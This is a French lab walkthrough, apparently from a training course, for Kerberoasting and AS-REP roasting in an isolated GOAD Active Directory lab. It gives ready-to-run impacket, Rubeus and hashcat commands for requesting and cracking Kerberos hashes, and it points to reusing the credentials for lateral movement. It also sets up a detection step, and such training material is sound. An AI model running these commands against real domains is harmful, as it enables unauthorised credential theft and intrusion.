# Build — Kerberoasting & AS-REP (lab isolé GOAD-X)

## Pré-requis
- Un compte de domaine (Kerberoasting) ; pour AS-REP, juste une liste d'utilisateurs. Poste attaquant
  (module 50). GOAD contient des comptes volontairement faibles.

## Étape 1 — Kerberoasting (impacket)
```bash
impacket-GetUserSPNs corp.meridian.com/user:'pass' -dc-ip 10.10.0.10 -request -outputfile kerb.hashes
# Rubeus (sur Windows) : Rubeus.exe kerberoast /outfile:kerb.hashes
```

## Étape 2 — Cassage hors-ligne (hashcat)
```bash
hashcat -m 13100 kerb.hashes rockyou.txt          # RC4
# AES : -m 19600 (AES128) / -m 19700 (AES256)
```

## Étape 3 — AS-REP Roasting
```bash
# comptes sans pré-auth (depuis l'énumération, module 51)
impacket-GetNPUsers corp.meridian.com/ -usersfile users.txt -no-pass -dc-ip 10.10.0.10 -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt
```

## Étape 4 — Exploiter le credential obtenu
Un mot de passe de compte de service cassé → accès à ce qu'il protège ; parfois un compte à
privilèges (SQL, etc.) → escalade/mouvement latéral (modules 53/56).

## Étape 5 — Consigner + préparer la détection
Note dans `journal.md` les SPN ciblés, l'etype (RC4 vs AES), le temps de cassage → base de defend.md.

## Vérification
- Au moins un TGS/AS-REP obtenu et (si mot de passe faible) cassé ; credential réutilisé.

## Pièges courants
- Horloge désynchronisée (Kerberos).
- Tout en AES → cassage irréaliste (c'est voulu côté défense).
